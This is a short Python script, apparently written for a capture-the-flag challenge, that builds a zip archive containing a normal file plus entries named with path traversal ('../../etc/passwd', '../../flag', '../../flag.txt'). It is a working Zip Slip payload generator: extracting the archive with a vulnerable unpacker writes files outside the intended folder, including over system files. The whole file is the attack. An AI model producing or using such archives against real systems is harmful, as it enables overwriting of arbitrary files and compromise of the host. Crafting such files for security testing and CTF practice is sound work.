import zipfile
import pathlib


if __name__ == '__main__':
    file_path = pathlib.Path(__file__).parent / 'test.txt'
    zip_file_path = pathlib.Path(__file__).parent / 'test.zip'
    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.write(file_path, arcname='test.txt')
        zip_file.write(file_path, arcname='../../etc/passwd')
        zip_file.write(file_path, arcname='../../flag')
        zip_file.write(file_path, arcname='../../flag.txt')
